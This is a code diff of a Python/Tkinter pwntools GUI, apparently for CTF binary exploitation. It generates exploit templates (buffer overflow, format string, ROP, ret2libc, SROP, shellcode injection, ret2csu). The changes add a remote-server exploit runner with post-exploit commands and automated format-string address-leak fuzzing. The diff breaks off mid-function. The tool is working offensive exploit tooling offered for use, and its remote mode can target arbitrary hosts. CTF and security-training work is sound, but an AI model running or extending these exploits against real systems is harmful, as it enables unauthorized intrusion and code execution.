@@ -19,6 +19,12 @@ import sys
 from typing import Dict, List, Any, Optional, Tuple, Union
 import traceback
 
+try:
+    from pwn import *
+    context.log_level = 'error'
+except ImportError:
+    print("Warning: pwntools not installed. Some features may not work.")
+
 class Logger:
     def __init__(self, log_callback=None):
         self.log_callback = log_callback
@@ -1448,7 +1454,7 @@ class IntelligentFuzzer:
 
 class ExploitGenerator:
     @staticmethod
-    def generate_buffer_overflow(offset: int, arch: str = 'x64') -> str:
+    def generate_buffer_overflow(offset: int, arch: str = 'x64', binary_path: str = './target') -> str:
         # Basic Ret2Win / Instruction Pointer Overwrite
         pack_fmt = 'p64' if arch == 'x64' else 'p32'
         
@@ -1456,7 +1462,7 @@ class ExploitGenerator:
 from pwn import *
 
 # Set up binary
-binary_path = './target'
+binary_path = '{binary_path}'
 context.binary = binary = ELF(binary_path, checksec=False)
 
 # Payload info
@@ -1476,14 +1482,15 @@ p.sendline(payload)
 p.interactive()
 '''
 
+
     @staticmethod
-    def generate_format_string(offset: int) -> str:
+    def generate_format_string(offset: int, binary_path: str = './target') -> str:
         # FmtStr Automation
         return f'''#!/usr/bin/env python3
 from pwn import *
 
 # Set up binary
-binary_path = './target'
+binary_path = '{binary_path}'
 context.binary = binary = ELF(binary_path, checksec=False)
 
 # Connect
@@ -1513,13 +1520,14 @@ p.sendline(payload)
 p.interactive()
 '''
 
+
     @staticmethod
-    def generate_rop_chain(arch: str = 'x64') -> str:
+    def generate_rop_chain(arch: str = 'x64', binary_path: str = './target') -> str:
         return f'''#!/usr/bin/env python3
 from pwn import *
 
 # Set up binary
-binary_path = './target'
+binary_path = '{binary_path}'
 context.binary = binary = ELF(binary_path, checksec=False)
 rop = ROP(binary)
 
@@ -1551,12 +1559,12 @@ p.interactive()
 '''
 
     @staticmethod
-    def generate_ret2win(offset: int, win_addr: str) -> str:
+    def generate_ret2win(offset: int, win_addr: str, binary_path: str = './target') -> str:
         return f'''#!/usr/bin/env python3
 from pwn import *
 
 # Set up binary
-binary_path = './target'
+binary_path = '{binary_path}'
 context.binary = binary = ELF(binary_path, checksec=False)
 
 # Connect
@@ -1578,13 +1586,13 @@ p.interactive()
 '''
 
     @staticmethod
-    def generate_ret2libc(offset: int, system_addr: str, binsh_addr: str, pop_rdi: str) -> str:
+    def generate_ret2libc(offset: int, system_addr: str, binsh_addr: str, pop_rdi: str, binary_path: str = './target') -> str:
         # Advanced Stage1/Stage2 Layout
         return f'''#!/usr/bin/env python3
 from pwn import *
 
 # Set up binary and libc
-binary_path = './target'
+binary_path = '{binary_path}'
 libc_path = '/lib/x86_64-linux-gnu/libc.so.6' # Check your libc path
 
 context.binary = binary = ELF(binary_path, checksec=False)
@@ -1645,12 +1653,12 @@ p.interactive()
 '''
 
     @staticmethod
-    def generate_ret2plt(offset: int, pop_rdi: str) -> str:
+    def generate_ret2plt(offset: int, pop_rdi: str, binary_path: str = './target') -> str:
         # Similar to Ret2Libc but focused on the PLT/GOT leak aspect
         return f'''#!/usr/bin/env python3
 from pwn import *
 
-context.binary = binary = ELF('./target', checksec=False)
+context.binary = binary = ELF('{binary_path}', checksec=False)
 rop = ROP(binary)
 
 p = process()
@@ -1681,11 +1689,11 @@ p.interactive()
 '''
 
     @staticmethod
-    def generate_srop(offset: int, syscall_addr: str) -> str:
+    def generate_srop(offset: int, syscall_addr: str, binary_path: str = './target') -> str:
         return f'''#!/usr/bin/env python3
 from pwn import *
 
-context.binary = binary = ELF('./target', checksec=False)
+context.binary = binary = ELF('{binary_path}', checksec=False)
 
 p = process()
 
@@ -1712,12 +1720,12 @@ p.interactive()
 '''
 
     @staticmethod
-    def generate_shellcode_injection(offset: int, arch: str = 'x64') -> str:
+    def generate_shellcode_injection(offset: int, arch: str = 'x64', binary_path: str = './target') -> str:
         # Based on user shellcraft example
         return f'''#!/usr/bin/env python3
 from pwn import *
 
-context.binary = binary = ELF('./target', checksec=False)
+context.binary = binary = ELF('{binary_path}', checksec=False)
 
 # 1. Generate Shellcode
 # shellcode = asm(shellcraft.sh())
@@ -1749,12 +1757,12 @@ p.interactive()
 '''
 
     @staticmethod
-    def generate_ret2csu(offset: int, arch: str = 'x64') -> str:
+    def generate_ret2csu(offset: int, arch: str = 'x64', binary_path: str = './target') -> str:
         # Universal Gadget Template (x64)
         return f'''#!/usr/bin/env python3
 from pwn import *
 
-context.binary = binary = ELF('./target', checksec=False)
+context.binary = binary = ELF('{binary_path}', checksec=False)
 p = process()
 
 offset = {offset}
@@ -1805,7 +1813,7 @@ p.interactive()
             "from pwn import *",
             "",
             "# Set up binary",
-            "binary_path = './target'",
+            "binary_path = '{binary_path}'",
             "context.binary = binary = ELF(binary_path, checksec=False)",
             "",
             "# Connect",
@@ -1872,17 +1880,24 @@ p.interactive()
         return "\n".join(script)
 
 class InteractiveSession:
-    def __init__(self, binary_path):
+    def __init__(self, binary_path=None, remote_ip=None, remote_port=None):
         self.binary_path = binary_path
+        self.remote_ip = remote_ip
+        self.remote_port = remote_port
         self.process = None
+        self.pwn_process = None  # For pwntools remote
         self.running = False
         self.output_queue = __import__('queue').Queue()
         self.history = []
         self.initial_output = ""
+        self.is_remote = bool(remote_ip and remote_port)
 
     def start(self):
         if self.running:
             return True
+        
+        if self.is_remote:
+            return self.start_remote()
             
         try:
             self.process = subprocess.Popen(
@@ -1901,6 +1916,32 @@ class InteractiveSession:
             return True
         except Exception as e:
             return False
+    
+    def start_remote(self):
+        """Start remote connection using pwntools."""
+        try:
+            from pwn import remote
+            self.pwn_process = remote(self.remote_ip, self.remote_port)
+            self.running = True
+            
+            # Start reader thread for remote
+            threading.Thread(target=self._read_pwn_output, daemon=True).start()
+            
+            return True
+        except Exception as e:
+            print(f"Remote connection failed: {e}")
+            return False
+    
+    def _read_pwn_output(self):
+        """Read output from pwntools remote connection."""
+        while self.running:
+            try:
+                chunk = self.pwn_process.recv(4096, timeout=0.1)
+                if chunk:
+                    self.output_queue.put(chunk)
+            except Exception:
+                break
+
 
     def _read_output(self, pipe):
         # Use standard read for unbuffered streams (bufsize=0)
@@ -1919,16 +1960,21 @@ class InteractiveSession:
         # Do NOT set self.running = False here to avoid race conditions
 
     def send(self, data):
-        if not self.running or not self.process:
+        if not self.running:
             return False
         
         try:
             if isinstance(data, str):
                 data = data.encode()
             
-            # Send actual newline byte
-            self.process.stdin.write(data + b'\n')
-            self.process.stdin.flush()
+            # Send to remote or local
+            if self.pwn_process:
+                self.pwn_process.sendline(data)
+            elif self.process:
+                self.process.stdin.write(data + b'\n')
+                self.process.stdin.flush()
+            else:
+                return False
             
             self.history.append({
                 'input': data.decode(errors='ignore'),
@@ -1961,9 +2007,14 @@ class InteractiveSession:
         if self.process:
             try:
                 self.process.terminate()
+                self.process.wait(timeout=1)
+            except:
+                self.process.kill()
+        if self.pwn_process:
+            try:
+                self.pwn_process.close()
             except:
                 pass
-            self.process = None
 
 
 if __name__ == "__main__":
@@ -2140,7 +2191,7 @@ class ROPGadgetFinder:
         except:
             return {}
 
-class CTFPwnToolGUI:
+class BinaryVulnScannerGUI:
     def __init__(self, root):
         self.root = root
         self.root.title("Binary Vulnerability Scanner and Fuzzer")
@@ -2220,7 +2271,6 @@ class CTFPwnToolGUI:
             ("📁 Load Binary File", self.load_binary),
             ("🔍 Analyze Binary", self.analyze_binary),
             ("🛡️ Vulnerability Scan", self.scan_vulnerabilities),
-            ("🎯 Fuzzing", self.start_fuzzing),
             ("⚡ Interactive Analysis", self.interactive_analysis),
             ("📊 Offset Calculation", self.calculate_offset),
             ("💣 Generate Exploit", self.generate_exploit),
@@ -2261,6 +2311,7 @@ class CTFPwnToolGUI:
         
         self._create_analysis_tab(self.notebook)
         self._create_vulnerabilities_tab(self.notebook)
+        # self._create_fuzzing_tab(self.notebook) # Removed per user request (integrated into Interactive)
         self._create_interactive_tab(self.notebook)
         self._create_exploit_tab(self.notebook)
         self._create_gadgets_tab()
@@ -2344,7 +2395,9 @@ class CTFPwnToolGUI:
         self.vuln_details.config(state='disabled')
     
     
-    # Fuzzing tab removed. All fuzzing is now context-aware in Interactive Tab.
+    
+
+
 
     
     def _create_interactive_tab(self, notebook):
@@ -2354,6 +2407,24 @@ class CTFPwnToolGUI:
         
         control_frame = tk.Frame(frame, bg='#2c3e50')
         control_frame.pack(fill=tk.X, padx=10, pady=10)
+        
+        # Connection type selection
+        connection_frame = tk.Frame(control_frame, bg='#2c3e50')
+        connection_frame.pack(side=tk.LEFT, padx=5)
+        
+        self.interactive_mode = tk.StringVar(value="local")
+        tk.Radiobutton(connection_frame, text="Local Binary", variable=self.interactive_mode, value="local", bg='#2c3e50', fg='white', selectcolor='#34495e').pack(side=tk.LEFT, padx=5)
+        tk.Radiobutton(connection_frame, text="Remote Server", variable=self.interactive_mode, value="remote", bg='#2c3e50', fg='white', selectcolor='#34495e').pack(side=tk.LEFT, padx=5)
+        
+        tk.Label(connection_frame, text="IP:", bg='#2c3e50', fg='white').pack(side=tk.LEFT, padx=(10, 5))
+        self.interactive_remote_ip = tk.Entry(connection_frame, width=12)
+        self.interactive_remote_ip.insert(0, "127.0.0.1")
+        self.interactive_remote_ip.pack(side=tk.LEFT, padx=2)
+        
+        tk.Label(connection_frame, text="Port:", bg='#2c3e50', fg='white').pack(side=tk.LEFT, padx=5)
+        self.interactive_remote_port = tk.Entry(connection_frame, width=6)
+        self.interactive_remote_port.insert(0, "1337")
+        self.interactive_remote_port.pack(side=tk.LEFT, padx=2)
         
         tk.Button(
             control_frame,
@@ -2398,6 +2469,7 @@ class CTFPwnToolGUI:
         frame = tk.Frame(self.notebook)
         self.notebook.add(frame, text="💣 Exploit")
         
+        # Top control bar
         control_frame = tk.Frame(frame)
         control_frame.pack(fill=tk.X, padx=10, pady=10)
         
@@ -2443,28 +2515,104 @@ class CTFPwnToolGUI:
 
         tk.Button(
             control_frame,
-            text="Edit in Code Editor",
-            command=self.open_in_editor_from_exploit,
-            bg='#9b59b6',
-            fg='white'
-        ).pack(side=tk.LEFT, padx=10)
-        
-        tk.Button(
-            control_frame,
             text="📋 Copy",
             command=lambda: self.copy_to_clipboard(self.exploit_editor),
             bg='#34495e',
             fg='white'
         ).pack(side=tk.LEFT, padx=10)
         
+        # Split pane: Editor on top, Runner on bottom
+        paned = tk.PanedWindow(frame, orient=tk.VERTICAL)
+        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # --- EXPLOIT EDITOR ---
+        editor_frame = tk.Frame(paned)
+        paned.add(editor_frame, height=350)
+        
+        tk.Label(editor_frame, text="Exploit Script", font=('Arial', 10, 'bold')).pack(anchor='w', padx=5)
+        
         self.exploit_editor = scrolledtext.ScrolledText(
-            frame,
+            editor_frame,
             wrap=tk.WORD,
             font=('Consolas', 10),
             bg='#1e1e1e',
-            fg='#d4d4d4'
+            fg='#d4d4d4',
+            insertbackground='white'
         )
-        self.exploit_editor.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        self.exploit_editor.pack(fill=tk.BOTH, expand=True)
+        
+        # --- EXPLOIT RUNNER ---
+        runner_frame = tk.Frame(paned, bg='#34495e')
+        paned.add(runner_frame, height=250)
+        
+        tk.Label(runner_frame, text="Exploit Runner", font=('Arial', 10, 'bold'), bg='#34495e', fg='white').pack(anchor='w', padx=5, pady=5)
+        
+        # Runner config
+        config_frame = tk.Frame(runner_frame, bg='#34495e')
+        config_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        self.exploit_target_type = tk.StringVar(value="local")
+        tk.Radiobutton(config_frame, text="Local Binary", variable=self.exploit_target_type, value="local", bg='#34495e', fg='white', selectcolor='#2c3e50').pack(side=tk.LEFT, padx=5)
+        tk.Radiobutton(config_frame, text="Remote Server", variable=self.exploit_target_type, value="remote", bg='#34495e', fg='white', selectcolor='#2c3e50').pack(side=tk.LEFT, padx=5)
+        
+        tk.Label(config_frame, text="IP:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=(20, 5))
+        self.exploit_remote_ip = tk.Entry(config_frame, width=15)
+        self.exploit_remote_ip.insert(0, "127.0.0.1")
+        self.exploit_remote_ip.pack(side=tk.LEFT, padx=5)
+        
+        tk.Label(config_frame, text="Port:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=5)
+        self.exploit_remote_port = tk.Entry(config_frame, width=8)
+        self.exploit_remote_port.insert(0, "1337")
+        self.exploit_remote_port.pack(side=tk.LEFT, padx=5)
+        
+        tk.Label(config_frame, text="Args:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=(20, 5))
+        self.exploit_args = tk.Entry(config_frame, width=20)
+        self.exploit_args.pack(side=tk.LEFT, padx=5)
+        
+        # Second config row for post-exploit commands
+        config_frame2 = tk.Frame(runner_frame, bg='#34495e')
+        config_frame2.pack(fill=tk.X, padx=5, pady=5)
+        
+        tk.Label(config_frame2, text="Post-Exploit Cmds:", bg='#34495e', fg='white').pack(side=tk.LEFT, padx=5)
+        self.post_exploit_cmds = tk.Entry(config_frame2, width=40)
+        self.post_exploit_cmds.insert(0, "id")  # Default command
+        self.post_exploit_cmds.pack(side=tk.LEFT, padx=5)
+        
+        self.exploit_debug_mode = tk.BooleanVar(value=False)
+        tk.Checkbutton(config_frame2, text="Debug (GDB)", variable=self.exploit_debug_mode, bg='#34495e', fg='white', selectcolor='#2c3e50').pack(side=tk.LEFT, padx=10)
+        
+        # Runner controls
+        controls_frame = tk.Frame(runner_frame, bg='#34495e')
+        controls_frame.pack(fill=tk.X, padx=5, pady=5)
+        
+        self.run_exploit_btn = tk.Button(controls_frame, text="▶ Run Exploit", command=self.run_exploit, bg='#27ae60', fg='white', width=15)
+        self.run_exploit_btn.pack(side=tk.LEFT, padx=5)
+        
+        self.stop_exploit_btn = tk.Button(controls_frame, text="⏹ Stop", command=self.stop_exploit, bg='#e74c3c', fg='white', width=10, state='disabled')
+        self.stop_exploit_btn.pack(side=tk.LEFT, padx=5)
+        
+        tk.Button(controls_frame, text="🗑️ Clear Output", command=self.clear_exploit_output, bg='#95a5a6', fg='white', width=12).pack(side=tk.LEFT, padx=5)
+        
+        self.exploit_status_label = tk.Label(controls_frame, text="Ready", bg='#34495e', fg='#ecf0f1', font=('Arial', 9, 'italic'))
+        self.exploit_status_label.pack(side=tk.LEFT, padx=20)
+        
+        # Output console
+        tk.Label(runner_frame, text="Output Console", font=('Arial', 9, 'bold'), bg='#34495e', fg='white').pack(anchor='w', padx=5)
+        
+        self.exploit_output = scrolledtext.ScrolledText(
+            runner_frame,
+            wrap=tk.WORD,
+            font=('Consolas', 9),
+            bg='#0d1117',
+            fg='#58a6ff',
+            height=10
+        )
+        self.exploit_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        self.exploit_output.config(state='disabled')
+        
+        # Initialize runner state
+        self.exploit_process = None
+        self.exploit_running = False
     
     def _create_gadgets_tab(self):
         frame = tk.Frame(self.notebook)
@@ -2561,6 +2709,8 @@ class CTFPwnToolGUI:
             font=('Consolas', 11),
             bg='#1e1e1e',
             fg='#d4d4d4',
+            insertbackground='white',  # Cursor color
+            selectbackground='#264f78',  # Selection background
             undo=True
         )
         self.code_editor.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
@@ -2996,184 +3146,28 @@ class CTFPwnToolGUI:
         
         index = selection[0]
         selected = self.vuln_listbox.get(index)
-    
-    def start_fuzzing(self):
-        if not self.binary_path:
-            messagebox.showwarning("Warning", "Please load a binary file first!")
-            return
         
-        def fuzz_thread():
-            self.is_running = True
-            self.update_status("Fuzzing in progress...", True)
-            self.root.after(0, self.start_fuzz_btn.config, {'state': 'disabled'})
-            self.root.after(0, self.start_intel_fuzz_btn.config, {'state': 'disabled'})
-            self.root.after(0, self.stop_fuzz_btn.config, {'state': 'normal'})
-            
-            try:
-                self.fuzzer = Fuzzer(self.binary_path)
-                max_cases = self.fuzz_count.get()
-                results = self.fuzzer.fuzz(max_cases)
-                
-                self.root.after(0, self.display_fuzzing_results, results)
-                self.root.after(0, self.log, f"Fuzzing completed! Found {len(results['crashes'])} crashes")
-                
-            except Exception as e:
-                self.root.after(0, self.log, f"Fuzzing failed: {str(e)}")
-            
-            finally:
-                self.root.after(0, lambda: self.update_status("Ready", False))
-                self.root.after(0, self.start_fuzz_btn.config, {'state': 'normal'})
-                self.root.after(0, self.start_intel_fuzz_btn.config, {'state': 'normal'})
-                self.root.after(0, self.stop_fuzz_btn.config, {'state': 'disabled'})
-                self.is_running = False
+        self.vuln_details.config(state='normal')
+        self.vuln_details.delete(1.0, tk.END)
         
-        if not self.is_running:
-            threading.Thread(target=fuzz_thread, daemon=True).start()
-    
-    def start_intelligent_fuzzing(self):
-        if not self.binary_path:
-            messagebox.showwarning("Warning", "Please load a binary file first!")
-            return
+        found = False
+        if self.current_results and 'vulnerabilities' in self.current_results:
+            for vuln in self.current_results['vulnerabilities']:
+                # Simple matching strategy
+                if vuln['type'] in selected:
+                    found = True
+                    self.vuln_details.insert(tk.END, f"Name: {vuln['type']}\n")
+                    self.vuln_details.insert(tk.END, f"Severity: {vuln['severity']}\n")
+                    self.vuln_details.insert(tk.END, f"Description: {vuln['description']}\n")
+                    self.vuln_details.insert(tk.END, f"-" * 30 + "\n")
+                    if 'cwe' in vuln:
+                         self.vuln_details.insert(tk.END, f"CWE: {vuln['cwe']}\n")
+                    break
         
-        def fuzz_thread():
-            self.is_running = True
-            self.update_status("Starting intelligent fuzzing...", True)
-            self.root.after(0, self.start_fuzz_btn.config, {'state': 'disabled'})
-            self.root.after(0, self.start_intel_fuzz_btn.config, {'state': 'disabled'})
-            self.root.after(0, self.stop_fuzz_btn.config, {'state': 'normal'})
-            
-            try:
-                self.intelligent_fuzzer = IntelligentFuzzer(self.binary_path)
-                
-                results = self.intelligent_fuzzer.run_comprehensive_fuzzing(
-                    max_options=self.intel_options.get(),
-                    tests_per_option=self.tests_per_option.get()
-                )
-                
-                self.root.after(0, self.display_intelligent_fuzzing_results, results)
-                self.root.after(0, self.log, f"Intelligent fuzzing completed! Found {results['total_crashes']} crashes")
-                
-            except Exception as e:
-                self.root.after(0, self.log, f"Fuzzing failed: {str(e)}")
-                traceback.print_exc()
-            
-            finally:
-                self.root.after(0, lambda: self.update_status("Ready", False))
-                self.root.after(0, self.start_fuzz_btn.config, {'state': 'normal'})
-                self.root.after(0, self.start_intel_fuzz_btn.config, {'state': 'normal'})
-                self.root.after(0, self.stop_fuzz_btn.config, {'state': 'disabled'})
-                self.is_running = False
-        
-        if not self.is_running:
-            threading.Thread(target=fuzz_thread, daemon=True).start()
-    
-    def display_fuzzing_results(self, results):
-        self.fuzz_text.config(state='normal')
-        self.fuzz_text.delete(1.0, tk.END)
-        
-        text = "=" * 60 + "\n"
-        text += "                   Fuzzing Report\n"
-        text += "=" * 60 + "\n\n"
-        
-        text += f"📊 Total Test Cases: {results['total_tests']}\n"
-        text += f"💥 Crashes Found: {len(results['crashes'])}\n"
-        text += f"🔄 Unique Crashes: {results['unique_crashes']}\n"
-        text += f"⏰ Timeouts: {len(results['hangs'])}\n"
-        text += f"📈 Crash Rate: {results['crash_rate']:.2%}\n\n"
-        
-        if results['crashes']:
-            text += "Crash Details:\n"
-            text += "-" * 40 + "\n"
-            for i, crash in enumerate(results['crashes'][:10], 1):
-                text += f"{i}. Input: {crash['input']}\n"
-                text += f"   Length: {crash['length']}\n"
-                text += f"   Signal: {crash.get('signal', 'Unknown')}\n"
-                text += f"   Test ID: {crash['test_id']}\n\n"
-        
-        self.fuzz_text.insert(tk.END, text)
-        self.fuzz_text.config(state='disabled')
-    
-    def display_intelligent_fuzzing_results(self, results):
-        self.fuzz_text.config(state='normal')
-        self.fuzz_text.delete(1.0, tk.END)
-        
-        text = "=" * 60 + "\n"
-        text += "              INTELLIGENT FUZZING REPORT\n"
-        text += "=" * 60 + "\n\n"
-        
-        text += "📋 MENU DISCOVERY\n"
-        text += "-" * 40 + "\n"
-        discovery = results.get('discovery', {})
-        text += f"Options discovered: {len(discovery.get('discovered_options', []))}\n"
-        text += f"Input points found: {len(discovery.get('input_points', []))}\n\n"
-        
-        for option in discovery.get('discovered_options', [])[:10]:
-            text += f"  • {option}: {discovery.get('menu_structure', {}).get(option, {}).get('description', 'No description')}\n"
-        
-        text += "\n🎯 FUZZING RESULTS\n"
-        text += "-" * 40 + "\n"
-        text += f"Total crashes: {results.get('total_crashes', 0)}\n"
-        text += f"Total leaks: {results.get('total_leaks', 0)}\n\n"
-        
-        fuzzing = results.get('fuzzing', [])
-        for fuzz_result in fuzzing:
-            option = fuzz_result.get('option', 'unknown')
-            crashes = len(fuzz_result.get('crashes', []))
-            leaks = len(fuzz_result.get('leaks', []))
-            
-            if crashes > 0 or leaks > 0:
-                text += f"  • {option}: {crashes} crashes, {leaks} leaks\n"
-                
-                if fuzz_result.get('crashes'):
-                    crash = fuzz_result['crashes'][0]
-                    text += f"    First crash at test #{crash.get('test_id')}, signal: {crash.get('signal')}\n"
-        
-        text += "\n📏 OFFSET CALCULATIONS\n"
-        text += "-" * 40 + "\n"
-        offsets = results.get('offsets', {})
-        
-        for key, offset_info in offsets.items():
-            if 'estimated_offset' in offset_info:
-                text += f"  • {key}: Offset ~{offset_info['estimated_offset']} (confidence: {offset_info.get('confidence', 'unknown')})\n"
-            elif 'exact_offset' in offset_info:
-                text += f"  • {key}: Exact offset {offset_info['exact_offset']}\n"
-            elif 'controlled_positions' in offset_info:
-                positions = offset_info['controlled_positions']
-                if positions:
-                    text += f"  • {key}: Format string positions {positions} are controlled\n"
-        
-        text += "\n💥 CRASH DETAILS\n"
-        text += "-" * 40 + "\n"
-        
-        crash_count = 0
-        for fuzz_result in fuzzing:
-            for crash in fuzz_result.get('crashes', [])[:3]:
-                crash_count += 1
-                text += f"\nCrash #{crash_count}:\n"
-                text += f"  Option: {crash.get('option')}\n"
-                text += f"  Input: {crash.get('input', '')[:50]}...\n"
-                text += f"  Signal: {crash.get('signal')}\n"
-                
-                offset_info = crash.get('offset_info', {})
-                if offset_info.get('found'):
-                    text += f"  Estimated offset: {offset_info.get('offset')}\n"
-        
-        if crash_count == 0:
-            text += "No crashes found.\n"
-        
-        text += "\n💡 RECOMMENDATIONS\n"
-        text += "-" * 40 + "\n"
-        
-        if results.get('total_crashes', 0) > 0:
-            text += "1. Check crash details for buffer overflow patterns\n"
-            text += "2. Use offset calculations for exploit development\n"
-            text += "3. Test format string positions if leaks were found\n"
-        else:
-            text += "No vulnerabilities found with current fuzzing.\n"
-            text += "Try increasing test count or exploring more options.\n"
-        
-        self.fuzz_text.insert(tk.END, text)
-        self.fuzz_text.config(state='disabled')
+        if not found:
+             self.vuln_details.insert(tk.END, f"Details for: {selected}\n(No further details available)")
+             
+        self.vuln_details.config(state='disabled')
     
     def interactive_analysis(self):
         if not self.binary_path:
@@ -3188,24 +3182,53 @@ class CTFPwnToolGUI:
         self.log("Switched to interactive analysis")
     
     def start_interactive_session(self):
-        if not self.binary_path:
-            messagebox.showwarning("Warning", "Please load a binary file first!")
-            return
-        
-        if hasattr(self, 'interactive_session') and self.interactive_session:
-            self.interactive_session.stop()
+        # Check if remote mode
+        if self.interactive_mode.get() == "remote":
+            ip = self.interactive_remote_ip.get()
+            port = self.interactive_remote_port.get()
             
-        self.interactive_session = InteractiveSession(self.binary_path)
-        if self.interactive_session.start():
-            self.interactive_text.delete(1.0, tk.END)
-            self.interactive_text.insert(tk.END, f"[*] Started session for {os.path.basename(self.binary_path)}\n")
-            self.update_status("Interactive session active", True)
+            if not ip or not port:
+                messagebox.showwarning("Warning", "Please enter IP and Port for remote connection!")
+                return
             
-            # Start UI updater
-            self._update_interactive_output()
+            try:
+                port = int(port)
+            except:
+                messagebox.showerror("Error", "Port must be a number!")
+                return
+            
+            if hasattr(self, 'interactive_session') and self.interactive_session:
+                self.interactive_session.stop()
+            
+            self.interactive_session = InteractiveSession(remote_ip=ip, remote_port=port)
+            if self.interactive_session.start():
+                self.interactive_text.delete(1.0, tk.END)
+                self.interactive_text.insert(tk.END, f"[*] Connected to {ip}:{port}\n")
+                self.update_status(f"Remote session active ({ip}:{port})", True)
+                self._update_interactive_output()
+            else:
+                self.log("Failed to connect to remote server")
+                messagebox.showerror("Error", f"Failed to connect to {ip}:{port}")
         else:
-            self.log("Failed to start interactive session")
-            messagebox.showerror("Error", "Failed to start binary process")
+            # Local mode
+            if not self.binary_path:
+                messagebox.showwarning("Warning", "Please load a binary file first!")
+                return
+            
+            if hasattr(self, 'interactive_session') and self.interactive_session:
+                self.interactive_session.stop()
+                
+            self.interactive_session = InteractiveSession(self.binary_path)
+            if self.interactive_session.start():
+                self.interactive_text.delete(1.0, tk.END)
+                self.interactive_text.insert(tk.END, f"[*] Started session for {os.path.basename(self.binary_path)}\n")
+                self.update_status("Interactive session active", True)
+                
+                # Start UI updater
+                self._update_interactive_output()
+            else:
+                self.log("Failed to start interactive session")
+                messagebox.showerror("Error", "Failed to start binary process")
 
     def _update_interactive_output(self):
         if hasattr(self, 'interactive_session') and self.interactive_session and self.interactive_session.running:
@@ -3234,10 +3257,79 @@ class CTFPwnToolGUI:
             return
 
         self.interactive_text.insert(tk.END, f"{user_input}\n")
+        
+        # Check if this is a format string payload
+        is_format_string = '%' in user_input and any(x in user_input for x in ['p', 's', 'x', 'n'])
+        
         if self.interactive_session.send(user_input):
             self.input_entry.delete(0, tk.END)
+            
+            # If format string, wait a bit and parse the output
+            if is_format_string:
+                self.root.after(200, self._parse_format_string_output)
         else:
             self.log("Failed to send input")
+
+    def _parse_format_string_output(self):
+        """Parse the last output for format string leaks and display them formatted"""
+        try:
+            # Get recent output from interactive text widget
+            last_output = self.interactive_text.get("end-10l", "end").strip()
+            
+            # Extract leaked addresses (0x... patterns)
+            import re
+            leak_pattern = r'(0x[0-9a-fA-F]{8,16})'
+            leaks = re.findall(leak_pattern, last_output)
+            
+            if leaks:
+                # Display formatted leak table
+                self.interactive_text.insert(tk.END, "\n" + "="*60 + "\n")
+                self.interactive_text.insert(tk.END, "🔍 FORMAT STRING LEAK DETECTED\n")
+                self.interactive_text.insert(tk.END, "="*60 + "\n")
+                self.interactive_text.insert(tk.END, f"{'Address':<20} {'Type':<15} {'Notes'}\n")
+                self.interactive_text.insert(tk.END, "-"*60 + "\n")
+                
+                for leak in leaks[:10]:  # Show first 10 leaks
+                    leak_type = self._identify_leak_type(leak)
+                    notes = self._get_leak_notes(leak, leak_type)
+                    self.interactive_text.insert(tk.END, f"{leak:<20} {leak_type:<15} {notes}\n")
+                
+                self.interactive_text.insert(tk.END, "="*60 + "\n\n")
+                self.interactive_text.see(tk.END)
+                
+                # Log summary
+                self.log(f"Detected {len(leaks)} leaked address(es)")
+        except Exception as e:
+            pass  # Silently fail if parsing doesn't work
+
+    def _identify_leak_type(self, address):
+        """Identify the type of leaked address"""
+        try:
+            addr_int = int(address, 16)
+            
+            # Stack addresses (typically 0x7f... or 0x7fff...)
+            if 0x7f0000000000 <= addr_int <= 0x7fffffffffff:
+                return "Stack/Libc"
+            # PIE/Heap addresses (typically 0x55... or 0x56...)
+            elif 0x550000000000 <= addr_int <= 0x56ffffffffff:
+                return "PIE/Heap"
+            # Low addresses - might be .text or .data
+            elif addr_int < 0x1000000:
+                return "Code/.data"
+            else:
+                return "Unknown"
+        except:
+            return "Unknown"
+
+    def _get_leak_notes(self, address, leak_type):
+        """Get notes about the leaked address"""
+        if "Stack" in leak_type:
+            return "Potential libc/stack leak"
+        elif "PIE" in leak_type:
+            return "Potential binary base leak"
+        elif "Code" in leak_type:
+            return "Potential code segment"
+        return ""
 
     def fuzz_custom_input(self):
         """Fuzz the current state by replaying history + payload"""
@@ -3267,45 +3359,110 @@ class CTFPwnToolGUI:
         tk.Button(fuzz_type_dialog, text="Buffer Overflow (Cyclic)", command=run_bof_fuzz, width=25, bg='#e74c3c', fg='white').pack(pady=5)
 
     def _fuzz_format_string(self, history):
+        """Smart format string fuzzing using pwntools for multi-prompt handling"""
         self.update_status("Fuzzing Format String...", True)
         self.log("Starting Format String Fuzzing (Offsets 1-55)...")
+        self.interactive_text.insert(tk.END, "\n" + "="*70 + "\n")
+        self.interactive_text.insert(tk.END, "🎯 AUTOMATED FORMAT STRING FUZZING\n")
+        self.interactive_text.insert(tk.END, "="*70 + "\n")
+        self.interactive_text.insert(tk.END, f"{'Offset':<10} {'Leaked Address':<20} {'Type':<15} {'Notes'}\n")
+        self.interactive_text.insert(tk.END, "-"*70 + "\n")
+        self.interactive_text.see(tk.END)
         
         try:
+            # Import pwntools locally
+            try:
+                import pwn
+                pwn.context.log_level = 'error'  # Suppress pwntools logging
+            except ImportError:
+                self.log("ERROR: pwntools not installed. Install with: pip3 install pwntools")
+                messagebox.showerror("Missing Dependency", "pwntools is required for advanced fuzzing.\nInstall with: pip3 install pwntools")
+                return
+            
             leaks = []
+            
             for i in range(1, 56):
-                # Using BinaryRunner for clean process iteration
-                runner = BinaryRunner(self.binary_path)
+                try:
+                    # Start fresh process
+                    p = pwn.process(self.binary_path)
+                    
+                    # Replay history (send all previous inputs)
+                    for step in history:
+                        try:
+                            # Try to receive until timeout (handle prompts)
+                            p.recv(timeout=0.5)
+                        except:
+                            pass
+                        
+                        # Send the historical input
+                        p.sendline(step['input'].encode() if isinstance(step['input'], str) else step['input'])
+                    
+                    # Now send the format string payload
+                    payload = f"%{i}$p"
+                    
+                    try:
+                        p.recv(timeout=0.5)  # Wait for prompt
+                    except:
+                        pass
+                    
+                    p.sendline(payload.encode())
+                    
+                    # Receive output
+                    try:
+                        output = p.recvall(timeout=1).decode(errors='ignore')
+                    except:
+                        try:
+                            output = p.recv(timeout=0.5).decode(errors='ignore')
+                        except:
+                            output = ""
+                    
+                    # Close process
+                    p.close()
+                    
+                    # Parse for leaks
+                    if output:
+                        import re
